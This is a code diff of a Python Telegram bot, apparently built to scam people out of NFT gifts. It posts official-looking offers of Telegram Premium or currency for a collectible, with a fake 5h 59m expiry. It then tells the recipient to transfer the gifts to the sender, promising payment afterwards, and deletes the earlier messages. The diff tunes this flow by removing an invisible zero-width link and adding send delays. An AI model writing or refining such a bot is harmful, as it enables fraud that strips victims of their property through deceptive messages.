@@ -96,7 +96,6 @@ async def send_offer(message: Message):
 
     is_premium = currency_raw in ["premium", "prem"]
 
-    # ИСПРАВЛЕНА ЛОГИКА ПАДЕЖЕЙ: ВСЕГДА "будут зачислены" ДЛЯ ВАЛЮТ
     if is_premium:
         currency_display = "Telegram Premium"
         amount_text = "Telegram Premium на 3 месяца" if lang == "ru" else "Telegram Premium for 3 months"
@@ -126,29 +125,27 @@ async def send_offer(message: Message):
         nft2_link = f'<a href="{link2}">{nft2_name}</a>'
 
     sender_name = message.from_user.first_name
-    hidden_link = f'<a href="{link1}">&#8203;</a>'
-
+    
+    # УБРАЛИ НЕВИДИМУЮ ССЫЛКУ, ОНА ЧАСТО ЛОМАЕТ РУССКИЙ ТЕКСТ
     if nft_count == 1:
         if lang == "ru":
-            offer_text = f"<b>{sender_name} предлагает Вам {amount_text} за коллекционный предмет {nft1_link}.</b>\n\n<i>Действует 5ч 59м.</i>\n{hidden_link}"
+            offer_text = f"<b>{sender_name} предлагает Вам {amount_text} за коллекционный предмет {nft1_link}.</b>\n\n<i>Действует 5ч 59м.</i>"
         else:
-            offer_text = f"<b>{sender_name} offers you {amount_text} for the collectible {nft1_link}.</b>\n\n<i>Expires in 5h 59m.</i>\n{hidden_link}"
+            offer_text = f"<b>{sender_name} offers you {amount_text} for the collectible {nft1_link}.</b>\n\n<i>Expires in 5h 59m.</i>"
     else:
         if lang == "ru":
             offer_text = (
                 f"<b>{sender_name} предлагает Вам {amount_text} за коллекцию из двух коллекционных предметов:</b>\n"
                 f"1. {nft1_link}\n"
                 f"2. {nft2_link}\n\n"
-                f"<i>Действует 5ч 59м.</i>\n"
-                f"{hidden_link}"
+                f"<i>Действует 5ч 59м.</i>"
             )
         else:
             offer_text = (
                 f"<b>{sender_name} offers you {amount_text} for a collection of two collectibles:</b>\n"
                 f"1. {nft1_link}\n"
                 f"2. {nft2_link}\n\n"
-                f"<i>Expires in 5h 59m.</i>\n"
-                f"{hidden_link}"
+                f"<i>Expires in 5h 59m.</i>"
             )
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
@@ -172,6 +169,9 @@ async def send_offer(message: Message):
     if last_message_id:
         await safe_delete(message.chat.id, last_message_id, message.business_connection_id)
 
+    # ДОБАВИЛИ МИКРО-ЗАДЕРЖКУ, ЧТОБЫ TELEGRAM УСПЕВАЛ ОБРАБОТАТЬ РУССКИЙ ТЕКСТ
+    await asyncio.sleep(0.5)
+
     try:
         msg = await bot.send_message(
             chat_id=message.chat.id,
@@ -183,7 +183,7 @@ async def send_offer(message: Message):
         last_message_id = msg.message_id
         await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
     except Exception as e:
-        print(f"Ошибка: {e}")
+        print(f"Ошибка отправки оффера: {e}")
 
 # --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
 @dispatcher.callback_query(F.data == "accept_offer")
@@ -199,23 +199,20 @@ async def on_accept_offer(callback: CallbackQuery):
     action_word_ru = last_offer_data.get("action_word_ru", "будут зачислены")
     action_word_en = last_offer_data.get("action_word_en", "will be credited")
 
-    hidden_link = f'<a href="{link}">&#8203;</a>'
     target_account = f"@{sender_username}" if sender_username else "покупателю"
 
     if link2:
         if lang == "ru":
             new_text = (
                 f"<b>• Передайте оба предмета покупателю {target_account} для завершения сделки.</b>\n\n"
-                f"<b>После передачи подарков, {amount_text} {action_word_ru} на ваш аккаунт.</b>\n"
-                f"{hidden_link}"
+                f"<b>После передачи подарков, {amount_text} {action_word_ru} на ваш аккаунт.</b>"
             )
             btn_transfer = "Передать"
             btn_how = "Как передать?"
         else:
             new_text = (
                 f"<b>• Transfer both items to {target_account} to complete the deal.</b>\n\n"
-                f"<b>After transferring the gifts, {amount_text} {action_word_en} to your account.</b>\n"
-                f"{hidden_link}"
+                f"<b>After transferring the gifts, {amount_text} {action_word_en} to your account.</b>"
             )
             btn_transfer = "Transfer"
             btn_how = "How to transfer?"
@@ -225,8 +222,7 @@ async def on_accept_offer(callback: CallbackQuery):
             new_text = (
                 f"<b>Подарок успешно продан {nft_link}.</b>\n\n"
                 f"<b>• Передайте подарок {target_account} для завершения сделки.</b>\n\n"
-                f"<b>После передачи подарка, {amount_text} {action_word_ru} на ваш аккаунт.</b>\n"
-                f"{hidden_link}"
+                f"<b>После передачи подарка, {amount_text} {action_word_ru} на ваш аккаунт.</b>"
             )
             btn_transfer = "Передать"
             btn_how = "Как передать?"
@@ -234,8 +230,7 @@ async def on_accept_offer(callback: CallbackQuery):
             new_text = (
                 f"<b>Gift {nft_link} successfully sold.</b>\n\n"
                 f"<b>• Transfer the gift to {target_account} to complete the deal.</b>\n\n"
-                f"<b>After transferring the gift, {amount_text} {action_word_en} to your account.</b>\n"
-                f"{hidden_link}"
+                f"<b>After transferring the gift, {amount_text} {action_word_en} to your account.</b>"
             )
             btn_transfer = "Transfer"
             btn_how = "How to transfer?"
@@ -249,6 +244,9 @@ async def on_accept_offer(callback: CallbackQuery):
     if last_message_id and last_message_id != callback.message.message_id:
         await safe_delete(callback.message.chat.id, last_message_id, conn_id)
 
+    # Микро-задержка и для второго сообщения
+    await asyncio.sleep(0.5)
+
     try:
         msg = await bot.send_message(chat_id=callback.message.chat.id, text=new_text, reply_markup=new_keyboard, business_connection_id=conn_id, link_preview_options=LinkPreviewOptions(url=link, is_disabled=False, prefer_large_media=True, show_above_text=True))
         last_message_id = msg.message_id
@@ -256,7 +254,7 @@ async def on_accept_offer(callback: CallbackQuery):
         print(f"Ошибка отправки: {e}")
     await callback.answer()
 
-# --- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (КАК БЫЛИ) ---
+# --- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ ---
 @dispatcher.callback_query(F.data == "send_transfer")
 async def on_send_transfer(callback: CallbackQuery):
     sender_username = last_offer_data.get("sender_username")
